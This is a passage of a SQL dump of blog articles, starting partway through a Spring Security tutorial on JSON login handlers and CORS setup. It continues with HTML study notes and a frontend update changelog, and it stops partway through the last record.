创建与并发登录控制（防止同一账号多点登录）。<br>\n    上下文存储：将认证后的令牌存入 SecurityContextHolder，这是 Spring Security 全局保存当前认证用户信息的核心容器，后续整个请求生命周期都可从中获取用户身份。<br>\n    事件发布：通过 ApplicationEventPublisher 发布认证成功事件，可用于记录日志、更新用户登录时间等业务扩展。<br>\n    成功处理：触发 AuthenticationSuccessHandler（认证成功处理器），执行成功逻辑（这里非常重要，对于前后端分离架构，我们一般需要返回JSON格式数据到前端）</li>\n</ol>\n<p>通过分析可以知道。我们需要重写 <code>AuthenticationSuccessHandler</code>和 <code>AuthenticationFailureHandler</code>的处理逻辑，使其返回JSON格式数据。</p>\n<hr />\n<h2 id=\"二-导入fastjson\">二. 导入fastjson</h2>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n    &lt;groupId&gt;com.alibaba.fastjson2&lt;/groupId&gt;\n    &lt;artifactId&gt;fastjson2&lt;/artifactId&gt;\n    &lt;version&gt;2.0.61&lt;/version&gt;\n    &lt;scope&gt;compile&lt;/scope&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>也可使用SpringBoot默认的jackson</p>\n<hr />\n<h2 id=\"三-重写-authenticationsuccesshandler\">三. 重写 <code>AuthenticationSuccessHandler</code></h2>\n<h3 id=\"1-创建-myauthenticationsuccesshandler\">1. 创建 <code>MyAuthenticationSuccessHandler</code></h3>\n<pre><code class=\"language-java\">public class MyAuthenticationSuccessHandler implements AuthenticationSuccessHandler {\n\n    @Override\n    public void onAuthenticationSuccess(HttpServletRequest request, HttpServletResponse response, Authentication authentication) throws IOException {\n\n        Object principal = authentication.getPrincipal(); // 获取用户身份信息\n        // Object credentials = authentication.getCredentials(); // 获取用户凭证信息(密码登录就是密码)\n        // Collection&lt;? extends GrantedAuthority&gt; authorities = authentication.getAuthorities(); // 获取用户权限信息\n\n        Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();\n\n        // 封装登录结果，这里简单用map封装\n        result.put(&quot;code&quot;,0);\n        result.put(&quot;message&quot;,&quot;登录成功&quot;);\n        result.put(&quot;data&quot;, principal);\n\n        // 转换为json格式\n        String json = JSON.toJSONString(result);\n\n        response.setContentType(&quot;application/json;charset=UTF-8&quot;);\n\n        response.getWriter().write(json);\n    }\n}\n</code></pre>\n<h3 id=\"2-配置-myauthenticationsuccesshandler\">2. 配置 <code>MyAuthenticationSuccessHandler</code></h3>\n<p>配置登录成功处理器为自定义的处理器</p>\n<pre><code class=\"language-java\">  .formLogin(form -&gt;\n        form.loginPage(&quot;/login&quot;)\n              .permitAll()\n              .usernameParameter(&quot;myUsername&quot;)\n              .passwordParameter(&quot;myPassword&quot;)\n              .successHandler(new MyAuthenticationSuccessHandler()) // 配置为自定义的登录成功处理器\n  )\n</code></pre>\n<hr />\n<h2 id=\"四-重写-authenticationfailurehandler\">四. 重写 <code>AuthenticationFailureHandler</code></h2>\n<h3 id=\"1-创建-myauthenticationfailurehandler\">1. 创建 <code>MyAuthenticationFailureHandler</code></h3>\n<pre><code class=\"language-java\">public class MyAuthenticationFailureHandler implements AuthenticationFailureHandler {\n\n    @Override\n    public void onAuthenticationFailure(HttpServletRequest request, HttpServletResponse response, AuthenticationException exception) throws IOException, ServletException {\n\n        String localizedMessage = exception.getLocalizedMessage(); // 获取异常的本地化信息\n\n        Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();\n        result.put(&quot;code&quot;,-1);\n        result.put(&quot;message&quot;,localizedMessage);\n\n        String json = JSON.toJSONString(result);\n        response.setContentType(&quot;application/json;charset=UTF-8&quot;);\n        response.getWriter().write(json);\n    }\n}\n</code></pre>\n<h3 id=\"2-配置-myauthenticationfailurehandler\">2. 配置 <code>MyAuthenticationFailureHandler</code></h3>\n<p>在 <code>.successHandler(new MyAuthenticationSuccessHandler())</code>后追加 <code>.failureHandler(new MyAuthenticationFailureHandler())</code></p>\n<hr />\n<h2 id=\"五-注销\">五. 注销</h2>\n<p>这里和登录成功、登录失败的流程差不多。</p>\n<h2 id=\"六-请求未认证的接口\">六. 请求未认证的接口</h2>\n<p>请求未认证默认会跳转登录页面，我们需要返回JSON数据</p>\n<h3 id=\"1-实现authenticationentrypoint接口\">1. 实现AuthenticationEntryPoint接口</h3>\n<pre><code class=\"language-java\">public class MyAuthenticationEntryPoint implements AuthenticationEntryPoint {\n\n    @Override\n    public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {\n        //获取错误信息\n        String localizedMessage = authException.getLocalizedMessage();\n\n        //创建结果对象\n        Map&lt;String, Object&gt; result = new HashMap();\n        result.put(&quot;code&quot;, -1);\n        result.put(&quot;message&quot;, localizedMessage);\n\n        //转换成json字符串\n        String json = JSON.toJSONString(result);\n\n        //返回响应\n        response.setContentType(&quot;application/json;charset=UTF-8&quot;);\n        response.getWriter().println(json);\n    }\n}\n</code></pre>\n<h3 id=\"2-配置\">2. 配置</h3>\n<pre><code class=\"language-java\">http.exceptionHandling(exception -&gt;\n        exception.authenticationEntryPoint(new MyAuthenticationEntryPoint())\n);\n</code></pre>\n<hr />\n<h2 id=\"七-跨域处理\">七. 跨域处理</h2>\n<h3 id=\"1-配置跨域策略\">1. 配置跨域策略</h3>\n<pre><code class=\"language-java\">@Bean\npublic CorsConfigurationSource corsConfigurationSource() {\n    CorsConfiguration config = new CorsConfiguration();\n    config.setAllowedOrigins(List.of(&quot;https://example.com&quot;));\n    config.setAllowedMethods(List.of(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;));\n    config.setAllowedHeaders(List.of(&quot;*&quot;));\n    config.setAllowCredentials(true);\n  \n    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n    source.registerCorsConfiguration(&quot;/**&quot;, config);\n    return source;\n}\n</code></pre>\n<h3 id=\"2-使用策略\">2. 使用策略</h3>\n<pre><code class=\"language-java\">http.cors(cors -&gt; cors.configurationSource(corsConfigurationSource()));\n</code></pre>\n', 'https://oss.lilicould.cn/cover/a039305b-8235-4666-8937-26c27ed3b6de_spring-security.png', 1, 51, 3, '2026-04-12 19:07:39', '2026-05-19 10:12:48', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (73, 'HTML学习笔记', 'html-note', '之前学HTML时候写的笔记', '# HTML 基础知识点整理\n\n## HTML 声明\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <!--lang属性用来声明网页默认语言-->\n<head>\n    <meta charset=\"UTF-8\">\n    <!--文件编码-->\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n  \n</body>\n</html>\n```\n\n## 标签\n\n### 标题标签 `<h>`\n\n<`h1>这是一个一级标题</h1>`\n\n1 表示一级标题，共有 1~6 六级\n\n### 段落标签和换行标签 `<p>`和 `<br />`\n\n`<p>这是一个段落标签</p>`\n\n段落标签用来将文字分成不同的段落\n\n`<br />`\n`<br>`\n\n换行标签（break）有两种写法，用来强制进行文本换行\n\n### 预定义格式标签 `<pre>`\n\nHTML `<pre>` 元素表示预定义格式文本。在该元素中的文本通常按照原文件中的编排，以等宽字体的形式展现出来，文本中的空白符（比如空格和换行符）都会显示出来。(紧跟在 `<pre>` 开始标签后的换行符也会被省略)\n\n### 文本格式化标签\n\n![](https://oss.lilicould.cn/file/e93d40f1-711b-4961-a970-7d635f2a5661_33ae5680-2e30-4674-ad26-6e6eecdb64ba.png)\n\n### 盒子标签 `<div>`和 `<span>`\n\n盒子用来装内容，方便网页的布局\n\n- `<div>` 盒子独占一行，大盒子\n- 一行可以有多个 `<span>` 盒子，小盒子\n\n### 图像标签<img>\n\n`<img src=\"图片路径\">`\n\n图像标签的基本属性：\n\n![](https://oss.lilicould.cn/file/2e044cef-4e38-469f-bbd8-1bf3b3c75ed8_2.png)\n\nwidth 和 height 只设置了其中一个时另一个属性根据图片比例自动设置\n\n### 超链接标签 `<a>`\n\n用于定义超链接，从一个页面跳转到另一个页面\n\n基本属性：\n\n![](https://oss.lilicould.cn/file/749ea77b-d4a2-4ff4-9479-a544e749a4ae_image.png)\n\n链接分类：\n\n![](https://oss.lilicould.cn/file/77804963-222c-4aee-9154-f4f88a1f8368_image.png)\n\n### 注释标签和特殊字符\n\n写 HTML 时便于理解和检查\n\n![](https://oss.lilicould.cn/file/c020bf36-c3bd-4b6d-9527-3133fe322e41_image.png)\n\n角标还可以用 `<sup>` 标签\n\n比如 `x<sup>2</sup>+y<sup>2</sup>=z<sup>2</sup>` 表示 x²+y²=z²\n\n### 表格标签\n\n用于显示，展示数据\n\n#### 基本结构\n\n```html\n<table> <!--表-->\n  <tr>	<!--行-->\n    <td>单元格内文字</td>\n    <td>单元格内文字</td>\n  </tr>\n</table>\n```\n\n#### 表头单元格标签<th>\n\n一般用于第一行或者第一列\n\n#### 表格属性\n\n![](https://oss.lilicould.cn/file/642f7d8b-aaca-4a01-a3e3-030e03cce0fb_image.png)\n\n通常不直接使用，在 CSS 中调整\n\n#### 表格结构标签\n\n1. `<thead>` 用于定义表格的头部区域\n2. `<tbody>` 用于定义表格的主体区域\n\n#### 合并单元格\n\n##### 合并单元格方式\n\n1. 跨行合并 `rowspan=\"合并单元格的个数\"`\n2. 跨列合并 `colspan=\"合并单元格的个数\"`\n\n![](https://oss.lilicould.cn/file/7a875306-b9ca-4d87-b5c8-838e5b0fdffa_image.png)\n\n##### 目标单元格\n\n跨行合并，目标单元格为最上侧单元格\n跨列合并，目标单元格为最左侧单元格\n\n##### 单元格合并步骤\n\n1. 确定合并方式\n2. 找到目标单元格，进行编辑\n3. 删除多余单元格\n\n### 列表标签\n\nul 与 ol 标签都有自己的属性，但实际应用中直接在 CSS 中调整\n\n#### 无序列表<ul>\n\n```html\n<ul>\n  <li>内容</li>\n  <li>内容</li>\n  ...\n</ul>\n```\n\n`<ul>` 标签中只能嵌套 `<li>` 标签，但是 `<li>` 标签相当于一个容器，可以存放任何元素\n\n#### 有序列表<ol>\n\n```html\n<ol>\n  <li>内容</li>\n  <li>内容</li>\n  ...\n</ol>\n```\n\n`<ol>` 标签中只能嵌套 `<li>` 标签，但是 `<li>` 标签相当于一个容器，可以存放任何元素\n\n#### 自定义列表<dl>\n\n```html\n<dl>\n  <dt>名词1</dt>\n  <dd>名词1解释1</dd>\n  <dd>名词1解释2</dd>\n  <dd>名词1解释3</dd>\n  <dd>名词1解释4</dd>\n  ...\n</dl>\n```\n\n`<dl>` 标签里面只能嵌套 `<dt>` 和 `<dd>` 标签\n\n### 表单标签\n\n表单标签的作用是收集用户信息\n\n#### 表单的组成\n\n![](https://oss.lilicould.cn/file/4776f15c-c76b-48aa-8f4b-c153b17b4bb1_image.png)\n\n#### 表单域<form>\n\n表单域是一个包含表单元素的区域，表单域会把其范围内的表单元素信息提交给服务器\n\n表单域属性：\n\n![](https://oss.lilicould.cn/file/b9a71685-4ced-4824-afff-ebed9861c2d3_image.png)\n\n#### 表单控件（表单元素）\n\n##### `<input>`表单元素\n\n用于收集用户信息\n\n`<input type=\"属性值\">`\n\n![](https://oss.lilicould.cn/file/8e120d48-f647-4216-9f90-95d29af5d6f4_image.png)\n\n```html\n<form action=\"post\">\n    用户名：<input type=\"text\"> <br>\n    密码：<input type=\"password\">\n</form>\n```\n\n示例结果\n\n![](https://oss.lilicould.cn/file/417d182f-0f27-4d86-a5aa-17945ea8bd2e_image.png)\n\n其他属性：\n\n![](https://oss.lilicould.cn/file/57a372df-1778-42f8-bd99-4940ce78104b_image.png)\n\n##### <label>标签\n\nlabel 标签为 input 元素定义标注\n\n用于绑定一个表单元素，增大点击面积，便于用户操作\n\n用法：将需要绑定的内容嵌套在 `<label>` 标签中，label 标签必须要有属性 `for=\"内容\"`，同时对应的 input 元素需要有属性 id，for 与 id 需要一致\n\n示例\n\n```html\n<label for=\"username\">用户名：</label>\n<input type=\"text\" name=\"username\" id=\"username\"> <br>\n```\n\n##### select下拉标签\n\n```html\n籍贯：\n<select name=\"area\" id=\"area\">\n    <option value=\"江西\">江西</option>\n    <option value=\"湖南\">湖南</option>\n    <option value=\"北京\">北京</option>\n    <option value=\"0\" selected=\"selected\">请选择您的籍贯\n    </option>\n</select>\n```\n\nselect 中至少包含一对 option\n\noption 中定义了 `selected=\"selected\"` 表示该项为默认选择项\n\n##### 文本域标签 `<textarea>`\n\n当用户输入内容太多的时候应该使用文本域标签\n\n基本结构\n\n`<textarea cols=\"每行的字符数\" rows=\"显示的行数\"> </textarea>`\n\ncols 和 rows 一般不使用，直接在 CSS 中改变\n\n## HTML5 新特性\n\n### HTML5 语义化新标签\n\n![](https://oss.lilicould.cn/file/1ab2b62c-ec17-48c9-80f7-598364bdbd5b_image.png)\n\n![](https://oss.lilicould.cn/file/be817891-49fd-4c11-bb85-89652a56d366_image.png)\n\n### HTML5 新增多媒体标签\n\n##### 视频 video 标签\n\n用法\n\n`<video src=\"文件地址\" controls=\"controls\"></video>`\n\n属性：\n\n![](https://oss.lilicould.cn/file/d45343ed-a4e7-4e20-ba87-79fdc7dc361c_image.png)\n\n##### 音频 audio 标签\n\n用法\n\n`<audio src=\"文件地址\" controls=\"controls\">`\n\n属性：\n\n![](https://oss.lilicould.cn/file/91855a7b-9c3a-4589-8430-0e01c8abf897_image.png)\n\n### HTML 新增 input 类型\n\n点击提交按钮就可以验证表单\n\n必须添加表单域\n\n![](https://oss.lilicould.cn/file/be9956d2-9fcc-4507-be5f-c3373997819d_image.png)\n\n### HTML 新增表单属性\n\n![](https://oss.lilicould.cn/file/c3d28cde-a58f-46a2-99be-919a13e44215_image.png)\n\n\n', '<h1 id=\"html-基础知识点整理\">HTML 基础知识点整理</h1>\n<h2 id=\"html-声明\">HTML 声明</h2>\n<pre><code class=\"language-html\">&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n  &lt;!--lang属性用来声明网页默认语言--&gt;\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;!--文件编码--&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  \n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<h2 id=\"标签\">标签</h2>\n<h3 id=\"标题标签-h\">标题标签 <code>&lt;h&gt;</code></h3>\n<p>&lt;<code>h1&gt;这是一个一级标题&lt;/h1&gt;</code></p>\n<p>1 表示一级标题，共有 1~6 六级</p>\n<h3 id=\"段落标签和换行标签-p和-br-\">段落标签和换行标签 <code>&lt;p&gt;</code>和 <code>&lt;br /&gt;</code></h3>\n<p><code>&lt;p&gt;这是一个段落标签&lt;/p&gt;</code></p>\n<p>段落标签用来将文字分成不同的段落</p>\n<p><code>&lt;br /&gt;</code><br>\n<code>&lt;br&gt;</code></p>\n<p>换行标签（break）有两种写法，用来强制进行文本换行</p>\n<h3 id=\"预定义格式标签-pre\">预定义格式标签 <code>&lt;pre&gt;</code></h3>\n<p>HTML <code>&lt;pre&gt;</code> 元素表示预定义格式文本。在该元素中的文本通常按照原文件中的编排，以等宽字体的形式展现出来，文本中的空白符（比如空格和换行符）都会显示出来。(紧跟在 <code>&lt;pre&gt;</code> 开始标签后的换行符也会被省略)</p>\n<h3 id=\"文本格式化标签\">文本格式化标签</h3>\n<p><img src=\"https://oss.lilicould.cn/file/e93d40f1-711b-4961-a970-7d635f2a5661_33ae5680-2e30-4674-ad26-6e6eecdb64ba.png\" alt=\"\" /></p>\n<h3 id=\"盒子标签-div和-span\">盒子标签 <code>&lt;div&gt;</code>和 <code>&lt;span&gt;</code></h3>\n<p>盒子用来装内容，方便网页的布局</p>\n<ul>\n  <li><code>&lt;div&gt;</code> 盒子独占一行，大盒子</li>\n  <li>一行可以有多个 <code>&lt;span&gt;</code> 盒子，小盒子</li>\n</ul>\n<h3 id=\"图像标签\">图像标签</h3>\n<p><code>&lt;img src=&quot;图片路径&quot;&gt;</code></p>\n<p>图像标签的基本属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/2e044cef-4e38-469f-bbd8-1bf3b3c75ed8_2.png\" alt=\"\" /></p>\n<p>width 和 height 只设置了其中一个时另一个属性根据图片比例自动设置</p>\n<h3 id=\"超链接标签-a\">超链接标签 <code>&lt;a&gt;</code></h3>\n<p>用于定义超链接，从一个页面跳转到另一个页面</p>\n<p>基本属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/749ea77b-d4a2-4ff4-9479-a544e749a4ae_image.png\" alt=\"\" /></p>\n<p>链接分类：</p>\n<p><img src=\"https://oss.lilicould.cn/file/77804963-222c-4aee-9154-f4f88a1f8368_image.png\" alt=\"\" /></p>\n<h3 id=\"注释标签和特殊字符\">注释标签和特殊字符</h3>\n<p>写 HTML 时便于理解和检查</p>\n<p><img src=\"https://oss.lilicould.cn/file/c020bf36-c3bd-4b6d-9527-3133fe322e41_image.png\" alt=\"\" /></p>\n<p>角标还可以用 <code>&lt;sup&gt;</code> 标签</p>\n<p>比如 <code>x&lt;sup&gt;2&lt;/sup&gt;+y&lt;sup&gt;2&lt;/sup&gt;=z&lt;sup&gt;2&lt;/sup&gt;</code> 表示 x²+y²=z²</p>\n<h3 id=\"表格标签\">表格标签</h3>\n<p>用于显示，展示数据</p>\n<h4 id=\"基本结构\">基本结构</h4>\n<pre><code class=\"language-html\">&lt;table&gt; &lt;!--表--&gt;\n  &lt;tr&gt;	&lt;!--行--&gt;\n    &lt;td&gt;单元格内文字&lt;/td&gt;\n    &lt;td&gt;单元格内文字&lt;/td&gt;\n  &lt;/tr&gt;\n&lt;/table&gt;\n</code></pre>\n<h4 id=\"表头单元格标签\">表头单元格标签</h4>\n<p>一般用于第一行或者第一列</p>\n<h4 id=\"表格属性\">表格属性</h4>\n<p><img src=\"https://oss.lilicould.cn/file/642f7d8b-aaca-4a01-a3e3-030e03cce0fb_image.png\" alt=\"\" /></p>\n<p>通常不直接使用，在 CSS 中调整</p>\n<h4 id=\"表格结构标签\">表格结构标签</h4>\n<ol>\n  <li><code>&lt;thead&gt;</code> 用于定义表格的头部区域</li>\n  <li><code>&lt;tbody&gt;</code> 用于定义表格的主体区域</li>\n</ol>\n<h4 id=\"合并单元格\">合并单元格</h4>\n<h5 id=\"合并单元格方式\">合并单元格方式</h5>\n<ol>\n  <li>跨行合并 <code>rowspan=&quot;合并单元格的个数&quot;</code></li>\n  <li>跨列合并 <code>colspan=&quot;合并单元格的个数&quot;</code></li>\n</ol>\n<p><img src=\"https://oss.lilicould.cn/file/7a875306-b9ca-4d87-b5c8-838e5b0fdffa_image.png\" alt=\"\" /></p>\n<h5 id=\"目标单元格\">目标单元格</h5>\n<p>跨行合并，目标单元格为最上侧单元格<br>\n跨列合并，目标单元格为最左侧单元格</p>\n<h5 id=\"单元格合并步骤\">单元格合并步骤</h5>\n<ol>\n  <li>确定合并方式</li>\n  <li>找到目标单元格，进行编辑</li>\n  <li>删除多余单元格</li>\n</ol>\n<h3 id=\"列表标签\">列表标签</h3>\n<p>ul 与 ol 标签都有自己的属性，但实际应用中直接在 CSS 中调整</p>\n<h4 id=\"无序列表\">无序列表</h4>\n<pre><code class=\"language-html\">&lt;ul&gt;\n  &lt;li&gt;内容&lt;/li&gt;\n  &lt;li&gt;内容&lt;/li&gt;\n  ...\n&lt;/ul&gt;\n</code></pre>\n<p><code>&lt;ul&gt;</code> 标签中只能嵌套 <code>&lt;li&gt;</code> 标签，但是 <code>&lt;li&gt;</code> 标签相当于一个容器，可以存放任何元素</p>\n<h4 id=\"有序列表\">有序列表</h4>\n<pre><code class=\"language-html\">&lt;ol&gt;\n  &lt;li&gt;内容&lt;/li&gt;\n  &lt;li&gt;内容&lt;/li&gt;\n  ...\n&lt;/ol&gt;\n</code></pre>\n<p><code>&lt;ol&gt;</code> 标签中只能嵌套 <code>&lt;li&gt;</code> 标签，但是 <code>&lt;li&gt;</code> 标签相当于一个容器，可以存放任何元素</p>\n<h4 id=\"自定义列表\">自定义列表</h4>\n<pre><code class=\"language-html\">&lt;dl&gt;\n  &lt;dt&gt;名词1&lt;/dt&gt;\n  &lt;dd&gt;名词1解释1&lt;/dd&gt;\n  &lt;dd&gt;名词1解释2&lt;/dd&gt;\n  &lt;dd&gt;名词1解释3&lt;/dd&gt;\n  &lt;dd&gt;名词1解释4&lt;/dd&gt;\n  ...\n&lt;/dl&gt;\n</code></pre>\n<p><code>&lt;dl&gt;</code> 标签里面只能嵌套 <code>&lt;dt&gt;</code> 和 <code>&lt;dd&gt;</code> 标签</p>\n<h3 id=\"表单标签\">表单标签</h3>\n<p>表单标签的作用是收集用户信息</p>\n<h4 id=\"表单的组成\">表单的组成</h4>\n<p><img src=\"https://oss.lilicould.cn/file/4776f15c-c76b-48aa-8f4b-c153b17b4bb1_image.png\" alt=\"\" /></p>\n<h4 id=\"表单域\">表单域</h4>\n<p>表单域是一个包含表单元素的区域，表单域会把其范围内的表单元素信息提交给服务器</p>\n<p>表单域属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/b9a71685-4ced-4824-afff-ebed9861c2d3_image.png\" alt=\"\" /></p>\n<h4 id=\"表单控件表单元素\">表单控件（表单元素）</h4>\n<h5 id=\"input表单元素\"><code>&lt;input&gt;</code>表单元素</h5>\n<p>用于收集用户信息</p>\n<p><code>&lt;input type=&quot;属性值&quot;&gt;</code></p>\n<p><img src=\"https://oss.lilicould.cn/file/8e120d48-f647-4216-9f90-95d29af5d6f4_image.png\" alt=\"\" /></p>\n<pre><code class=\"language-html\">&lt;form action=&quot;post&quot;&gt;\n    用户名：&lt;input type=&quot;text&quot;&gt; &lt;br&gt;\n    密码：&lt;input type=&quot;password&quot;&gt;\n&lt;/form&gt;\n</code></pre>\n<p>示例结果</p>\n<p><img src=\"https://oss.lilicould.cn/file/417d182f-0f27-4d86-a5aa-17945ea8bd2e_image.png\" alt=\"\" /></p>\n<p>其他属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/57a372df-1778-42f8-bd99-4940ce78104b_image.png\" alt=\"\" /></p>\n<h5 id=\"标签-1\">标签</h5>\n<p>label 标签为 input 元素定义标注</p>\n<p>用于绑定一个表单元素，增大点击面积，便于用户操作</p>\n<p>用法：将需要绑定的内容嵌套在 <code>&lt;label&gt;</code> 标签中，label 标签必须要有属性 <code>for=&quot;内容&quot;</code>，同时对应的 input 元素需要有属性 id，for 与 id 需要一致</p>\n<p>示例</p>\n<pre><code class=\"language-html\">&lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt;\n&lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt; &lt;br&gt;\n</code></pre>\n<h5 id=\"select下拉标签\">select下拉标签</h5>\n<pre><code class=\"language-html\">籍贯：\n&lt;select name=&quot;area&quot; id=&quot;area&quot;&gt;\n    &lt;option value=&quot;江西&quot;&gt;江西&lt;/option&gt;\n    &lt;option value=&quot;湖南&quot;&gt;湖南&lt;/option&gt;\n    &lt;option value=&quot;北京&quot;&gt;北京&lt;/option&gt;\n    &lt;option value=&quot;0&quot; selected=&quot;selected&quot;&gt;请选择您的籍贯\n    &lt;/option&gt;\n&lt;/select&gt;\n</code></pre>\n<p>select 中至少包含一对 option</p>\n<p>option 中定义了 <code>selected=&quot;selected&quot;</code> 表示该项为默认选择项</p>\n<h5 id=\"文本域标签-textarea\">文本域标签 <code>&lt;textarea&gt;</code></h5>\n<p>当用户输入内容太多的时候应该使用文本域标签</p>\n<p>基本结构</p>\n<p><code>&lt;textarea cols=&quot;每行的字符数&quot; rows=&quot;显示的行数&quot;&gt; &lt;/textarea&gt;</code></p>\n<p>cols 和 rows 一般不使用，直接在 CSS 中改变</p>\n<h2 id=\"html5-新特性\">HTML5 新特性</h2>\n<h3 id=\"html5-语义化新标签\">HTML5 语义化新标签</h3>\n<p><img src=\"https://oss.lilicould.cn/file/1ab2b62c-ec17-48c9-80f7-598364bdbd5b_image.png\" alt=\"\" /></p>\n<p><img src=\"https://oss.lilicould.cn/file/be817891-49fd-4c11-bb85-89652a56d366_image.png\" alt=\"\" /></p>\n<h3 id=\"html5-新增多媒体标签\">HTML5 新增多媒体标签</h3>\n<h5 id=\"视频-video-标签\">视频 video 标签</h5>\n<p>用法</p>\n<p><code>&lt;video src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;&lt;/video&gt;</code></p>\n<p>属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/d45343ed-a4e7-4e20-ba87-79fdc7dc361c_image.png\" alt=\"\" /></p>\n<h5 id=\"音频-audio-标签\">音频 audio 标签</h5>\n<p>用法</p>\n<p><code>&lt;audio src=&quot;文件地址&quot; controls=&quot;controls&quot;&gt;</code></p>\n<p>属性：</p>\n<p><img src=\"https://oss.lilicould.cn/file/91855a7b-9c3a-4589-8430-0e01c8abf897_image.png\" alt=\"\" /></p>\n<h3 id=\"html-新增-input-类型\">HTML 新增 input 类型</h3>\n<p>点击提交按钮就可以验证表单</p>\n<p>必须添加表单域</p>\n<p><img src=\"https://oss.lilicould.cn/file/be9956d2-9fcc-4507-be5f-c3373997819d_image.png\" alt=\"\" /></p>\n<h3 id=\"html-新增表单属性\">HTML 新增表单属性</h3>\n<p><img src=\"https://oss.lilicould.cn/file/c3d28cde-a58f-46a2-99be-919a13e44215_image.png\" alt=\"\" /></p>\n', 'https://oss.lilicould.cn/cover/1028cb21-c046-469a-ab3a-e9ba2d067d4a_html5-logo-for-web-development.png', 1, 43, 2, '2026-04-12 19:27:45', '2026-05-19 10:05:39', 2, 2, 0);
INSERT INTO `liliblog`.`article` (`id`, `title`, `slug`, `summary`, `content`, `content_html`, `cover_image`, `status`, `view_count`, `category_id`, `create_time`, `update_time`, `create_by`, `update_by`, `deleted`) VALUES (74, '2026-5-1前端更新', '2026-5-1-front-update', '对前端进行了UI上的更新', '# LiliBlog 前端更新日志 - 2026.05.01\n\n## 本次更新内容\n\n### UI 重构与优化\n\n**1. Emoji 替换为 SVG 图标**\n\n- AppHeader.vue：Logo、下拉菜单图标全部替换为专业 SVG 图标\n- AppFooter.vue：Logo 图标同步替换\n\n**2. 朋克风格改造**\n\n- Hero 区域标题：Glitch 故障闪烁字效果（青色/玫红重影）\n- 副标题：朋克打字机效果 + 闪烁光标\n- 加载更多按钮：朋克数据流风格（边框呼吸、流光扫过、数据流动画）\n- Hover 状态配色优化：纯白文字 + 青色发光 + 多层阴影\n\n**3. 自定义光标优化**\n\n- 外圈：默认青色(#00f0ff) / Hover玫红色(#ff003c)\n- 内点：纯白色 + 发光效果\n- 所有状态添加 box-shadow 增强可见性\n\n**4. 标题空格修复**\n\n- \"LILICOULD\'S BLOG\" 中间空格显示优化\n\n### 动画系统升级\n\n**1. anime.js 升级到 v4.4.1**\n\n- HomeView.vue：使用 createTimeline + animate + stagger 新 API\n- ArticleCard.vue：animate() 替代 anime()\n- AppSidebar.vue：同上\n- useHeroCarousel.ts：同上\n- 修复 v4 API 兼容问题（onComplete、alternate 等）\n\n**2. 动画细节修复**\n\n- 统计数字动画：Math.round() 修复小数撑爆盒子问题\n- TypeScript 编译错误修复（非空断言等）\n\n### 性能优化\n\n**1. 移除无用依赖**\n\n- echarts（未使用，减少 1.2MB）\n- v-viewer / viewerjs（未使用，减少 100KB）\n\n**2. 按需加载**\n\n- Element Plus 改为按需导入（减少 ~500KB）\n- FilePreview.vue：@vue-office 系列组件动态导入\n- ChatRoomView.vue：同上\n\n**3. 效果**\n\n- 首屏大小：~2-3MB → ~500KB（提升 80%）\n- 加载时间(1Mbps)：~12秒 → ~2.4秒\n\n### Bug 修复\n\n1. defineAsyncComponent 导入来源错误（vue-router → vue）\n2. Element Plus 运行时初始化错误（移除 manualChunks 配置）\n3. 副标题不显示问题（opacity 修复）\n4. TypeScript 类型错误修复\n\n---\n\n## 修改文件清单\n\n| 文件                                   | 修改内容                                                     |\n| -------------------------------------- | ------------------------------------------------------------ |\n| package.json                           | 移除 echarts, v-viewer, viewerjs；升级 animejs 到 v4         |\n| main.ts                                | 移除 Element Plus 完整导入                                   |\n| vite.config.ts                         | 简化构建配置                                                 |\n| src/assets/styles/variables.css        | 设计系统重建（温暖橙色调）                                   |\n| src/components/layout/AppHeader.vue    | SVG 图标替换、删除冗余 CSS                                   |\n| src/components/layout/AppFooter.vue    | SVG 图标替换                                                 |\n| src/components/layout/AppSidebar.vue   | anime.js v4 迁移、统计数字修复                               |\n| src/components/common/ArticleCard.vue  | anime.js v4 迁移                                             |\n| src/components/common/CustomCursor.vue | 赛博朋克配色优化                                             |\n| src/views/home/HomeView.vue            | Glitch 效果、打字机效果、加载按钮重构、标题空格、anime.js v4 |\n| src/views/preview/FilePreview.vue      | 动态导入、导入来源修复                                       |\n| src/views/chat/ChatRoomView.vue        | 动态导入                                                     |\n| src/composables/useHeroCarousel.ts     | anime.js v4 迁移                                             |\n\n## 非常不错的图片\n\n![](https://oss.lilicould.cn/file/3d3ad594-5522-469f-8a43-d9545b77b563_hero-1.png)\n', '<h1 id=\"liliblog-前端更新日志---20260501\">LiliBlog 前端更新日志 - 2026.05.01</h1>\n<h2 id=\"本次更新内容\">本次更新内容</h2>\n<h3 id=\"ui-重构与优化\">UI 重构与优化</h3>\n<p><strong>1. Emoji 替换为 SVG 图标</strong></p>\n<ul>\n  <li>AppHeader.vue：Logo、下拉菜单图标全部替换为专业 SVG 图标</li>\n  <li>AppFooter.vue：Logo 图标同步替换</li>\n</ul>\n<p><strong>2. 朋克风格改造</strong></p>\n<ul>\n  <li>Hero 区域标题：Glitch 故障闪烁字效果（青色/玫红重影）</li>\n  